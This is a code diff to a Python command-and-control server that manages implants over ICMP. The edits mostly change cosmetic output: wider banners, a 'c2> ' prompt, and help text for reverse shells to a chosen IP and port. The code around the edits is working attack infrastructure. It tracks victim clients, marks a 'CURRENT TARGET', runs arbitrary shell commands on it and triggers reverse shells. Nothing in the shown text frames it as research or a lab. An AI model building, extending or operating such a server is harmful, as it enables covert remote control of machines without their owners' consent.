@@ -44,7 +44,7 @@ def checksum(data):
 
 def display_clients():
     """Display all known clients."""
-    print("\n=== Connected Clients ===")
+    print("\n========================= Connected Clients ==========================")
     if not clients:
         print("No clients connected.")
     else:
@@ -53,18 +53,19 @@ def display_clients():
             print(f"{i}. Client ID: {client_id} | IP: {info['addr'][0]} | Last seen: {last_seen:.1f}s ago")
             if current_client and current_client == client_id:
                 print(f"   >>> CURRENT TARGET <<<")
-    print("=========================\n")
+    print("======================================================================\n")
 
 def help_menu():
     """Display available commands."""
-    print("\n=== Available Commands ===")
-    print("clients             - List all connected clients")
-    print("target <client_id>  - Select a client to send commands to")
-    print("shell               - Request a reverse shell (listen on port 4444 first)")
-    print("CMD:<command>       - Execute a shell command on the target")
-    print("exit                - Exit the server")
-    print("help                - Show this help menu")
-    print("=========================\n")
+    print("\n========================= Available Commands =========================")
+    print("clients                  - List all connected clients")
+    print("target <client_id>       - Select a client to send commands to")
+    print("shell <port>             - Request a reverse shell (Defaults to 4444)")
+    print("shell <IP_addr> <port>   - Request a reverse shell (Defaults to 4444)")
+    print("CMD:<command>            - Execute a shell command on the target")
+    print("exit                     - Exit the server")
+    print("help                     - Show this help menu")
+    print("======================================================================\n")
 
 def main():
     """Main server functionality"""
@@ -78,8 +79,15 @@ def main():
     print("[+] Type 'help' for available commands")
     
     last_cleanup = time.time()
+    prompt_displayed = False
     
     while True:
+        # Display prompt only once after processing input
+        if not prompt_displayed:
+            sys.stdout.write("c2> ")
+            sys.stdout.flush()
+            prompt_displayed = True
+        
         # Clean up stale clients every 60 seconds
         if time.time() - last_cleanup > 60:
             stale_clients = []
@@ -88,15 +96,19 @@ def main():
                     stale_clients.append(client_id)
             
             for client_id in stale_clients:
-                print(f"[!] Client {client_id} timed out and removed")
+                print(f"\n[!] Client {client_id} timed out and removed")
                 del clients[client_id]
             
             if current_client and current_client not in clients:
                 current_client = None
-                print("[!] Current target disconnected")
+                print("\n[!] Current target disconnected")
+                # Redisplay prompt after printing messages
+                sys.stdout.write("c2> ")
+                sys.stdout.flush()
             
             last_cleanup = time.time()
-        
+
+        # Check for client messages or user input
         ready, _, _ = select.select([sock, sys.stdin], [], [], 1)
         
         # Check if there is an incoming ICMP message
@@ -123,6 +135,9 @@ def main():
                 if current_client is None:
                     current_client = client_id
                     print(f"[+] Automatically targeting client {client_id}")
+                # Redisplay prompt after printing messages
+                sys.stdout.write("c2> ")
+                sys.stdout.flush()
             else:
                 clients[client_id] = {
                     'addr': addr,
@@ -134,10 +149,14 @@ def main():
                 pass  # Just a heartbeat, no need to print
             else:
                 print(f"\n[+] Message from {addr[0]} (ID {client_id}): {payload}")
+                # Redisplay prompt after printing messages
+                sys.stdout.write("c2> ")
+                sys.stdout.flush()
         
         # Check if the user entered a command
         if sys.stdin in ready:
-            command = input("c2> ").strip()
+            command = input().strip()
+            prompt_displayed = False  # Reset flag to display prompt again
             
             if not command:
                 continue
